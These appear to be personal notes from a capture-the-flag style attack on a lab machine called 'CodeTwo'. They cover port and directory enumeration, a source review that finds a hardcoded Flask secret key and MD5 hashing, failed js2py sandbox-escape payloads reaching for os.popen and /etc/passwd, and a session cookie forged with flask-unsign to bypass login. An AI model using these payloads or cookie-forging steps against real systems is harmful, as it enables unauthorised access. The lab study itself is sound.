# Port Enum
```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Directory Enum
```
http://10.10.11.82:8000/
http://10.10.11.82:8000/download
http://10.10.11.82:8000/login
http://10.10.11.82:8000/register
http://10.10.11.82:8000/static/js/script.js
http://10.10.11.82:8000/static/css/styles.css
http://10.10.11.82:8000/dashboard => http://10.10.11.82:8000/login
http://10.10.11.82:8000/logout => http://10.10.11.82:8000/
```

from the `/download`, the site gives a zip file called `app.zip`. 

# Observations on the site
It seems the site is sort of a code editor.
allows you to run and save code, only javascript
![[Pasted image 20250829012823.png]]
was able to register and login without any form of confirmation.

# The zip file
## file structure
```
❯ ls -la
total 28
drwxrwxr-x. 5 cyberfreak cyberfreak 4096 Jun 10 11:37 .
drwxr-xr-x. 3 cyberfreak cyberfreak 4096 Aug 29 01:29 ..
-rw-r--r--. 1 cyberfreak cyberfreak 3675 Jun 11 08:46 app.py
drwxrwxr-x. 2 cyberfreak cyberfreak 4096 Jan 17  2025 instance
-rw-rw-r--. 1 cyberfreak cyberfreak   49 Jan 17  2025 requirements.txt
drwxr-xr-x. 4 cyberfreak cyberfreak 4096 Oct 26  2024 static
drwxr-xr-x. 2 cyberfreak cyberfreak 4096 Jan 17  2025 templates
```

upon inspection, the zip file is the same as the one hosted on the vuln machine.
it is a flask web application using gunicorn server.
We can find our exploit for this when ran locally
## app.py review
From the `app.py` file, we observed more endpoints:
- `/run_code`
- `/save_code`
- `/delete_code/${codeId}`

Other observations include:
- Hardcoded info
	There was hardcoded flask secret_key, allowing for auth bypass/privilege escalation as you can forge your own cookies.
	`app.secret_key = 'S3cr3tK3yC0d3Tw0'`
- Weak Password Hashing
	The app used **MD5** for passwords
	`password_hash = hashlib.md5(password.encode()).hexdigest()`
	Quite easy to crack
- `/run_code` execution
	The app uses **js2py**, not `exec` in Python. So you’re executing **JavaScript code in Python’s `js2py` engine**.
    Import of Python modules is **disabled** via `js2py.disable_pyimport()`. So direct Python RCE is blocked.        
    But js2py has a history of **sandbox escapes** → e.g., breaking out into Python objects by abusing JS builtins.
- Other endpoints
	- `/save_code` → No validation, but just DB insert (no path traversal risk here).
    - `/delete_code/<id>` → Checks ownership (`code.user_id == session['user_id'}`). Prevents basic IDOR, but if you can forge sessions (see #1), you can delete any code.
    - `/download` → Serves `app.zip` from `/home/app/app/static/`.

# Local testing of the application
Went about testing the different endpoints with various payloads
```bash
❯ curl -X POST http://127.0.0.1:5000/run_code \
     -H 'Content-Type: application/json' \
     -d '{"code":"7*7"}'
{
  "result": 49
}

# See what global objects are exposed
❯ curl -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"Object.keys(this)"}'

{
  "error": "'NoneType' object is not callable"
}

# Try dumping globals
❯ curl -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"JSON.stringify(Object.getOwnPropertyNames(this))"}'

{
  "result": "{}"
}

❯ curl -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"JSON.stringify(Object.getOwnPropertyNames(global))"}'

{
  "error": "ReferenceError: global is not defined"
}

❯ curl -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"JSON.stringify(Object.getOwnPropertyNames(window))"}'

{
  "result": "{}"
}

# Inspecting function constructors
❯ curl -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"(function(){}).constructor('return 1337')()"}'

{
  "result": 1337
}
```

```bash
curl -s -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"(function(){return this})().constructor.constructor(\\'return typeof __import__\\')()"}'

{
  "error": "SyntaxError: Line 1: Unexpected token ILLEGAL"
}

curl -s -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"(function(){return this})().constructor.constructor(\\'return __import__(\"os\").popen(\"id\").read()\\')()"}'

{
  "error": "SyntaxError: Line 1: Unexpected token ILLEGAL"
}


curl -s -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"JSON.stringify(Object.getOwnPropertyNames((function(){return this})()))"}'

{
  "result": "{}"
}

curl -s -X POST http://127.0.0.1:5000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code":"(function(){return this})().constructor.constructor(\\'return open(\"/etc/passwd\").read()\\')()"}'

{
  "error": "SyntaxError: Line 1: Unexpected token ILLEGAL"
}
```

was not getting a progress with this.
Anything that tries to drop **Python code inside the JS `Function` constructor** immediately throws  
    `SyntaxError: Line 1: Unexpected token ILLEGAL`.  
    → That’s because `js2py` is faithfully parsing JS, and when it sees Python keywords (`return __import__(...)`, `open(...)`) it just bails — it never gets passed through to the Python interpreter.  
    → In other words: the naive `Function(...Python...)` escape is blocked in this setup.
Global object inspection is almost empty (`{}`), and `global/window` are undefined or empty.  
    → This confirms js2py is running in a **very minimal ES5 sandbox**, not exposing Python objects by default.
This means: 
✅ JS code works (`7*7`, `Function("return 1337")()`).  
❌ No direct `__import__` or `open()` bridging into Python.  
❌ No obvious Python object leakage in `this`, `global`, `window`.

Pivoted to the harcoded secret key.
Created a session cookie with it.
```bash
❯ flask-unsign --sign \
  --cookie "{'user_id': 1, 'username': 'admin'}" \
  --secret 'S3cr3tK3yC0d3Tw0'
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aLIhtg.6eGdsbtVcoSuiEPL8guq4jP5jQs
```

```bash
❯ curl -v http://127.0.0.1:5000/dashboard \
  --cookie "session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aLIhtg.6eGdsbtVcoSuiEPL8guq4jP5jQs"
*   Trying 127.0.0.1:5000...
* Connected to 127.0.0.1 (127.0.0.1) port 5000
> GET /dashboard HTTP/1.1
> Host: 127.0.0.1:5000
> User-Agent: curl/8.9.1
> Accept: */*
> Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aLIhtg.6eGdsbtVcoSuiEPL8guq4jP5jQs
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Werkzeug/3.1.3 Python/3.11.12
< Date: Fri, 29 Aug 2025 21:55:58 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 1661
< Vary: Cookie
< Connection: close
< 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CodeTwo Dashboard</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Poppins:wght@400;500;700&display=swap">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1>Dashboard</h1>
            <p>Create, save, run, and manage your JavaScript code with CodeTwo.</p><br>
            <a href="/logout" class="cta-button">Logout</a>
        </header>

        <!-- Code Editor Section -->
        <section class="editor-section">
            <h2>Code Editor</h2>
            <div class="editor-container">
                <textarea id="codeEditor" placeholder="var x = 16;&#10;x;"></textarea>
            </div>
            <div class="button-group">
                <button id="saveButton" class="primary-btn">Save Code</button>
                <button id="runButton" class="secondary-btn">Run Code</button>
            </div>
        </section>

        <!-- Output Section -->
        <section class="output-section">
            <h2>Output</h2>
            <div id="outputContainer" class="output-box"></div>
        </section>

        <!-- Saved Codes Section -->
        <section class="saved-codes-section">
            <h2>Saved Codes</h2>
            <ul id="codeList" class="code-list">
                
            </ul>
        </section>
    </div>

    <script src="/static/js/script.js"></script>
</body>
* shutting down connection #0
</html>%            
```

With this, we have bypassed authentication with a forged cookie. Went on to try the different endpoints with the cookie and they all worked as expected.

Working on the site
Created a new user.
creds => user:password
Observed the cookie created.
```json
{
	Cookie: "session=eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InVzZXIifQ.aLD7DA.yaaNtqX3mBCYuwhqnaulgyyBfKM"
}
```

so now, i try to create my own admin cookie.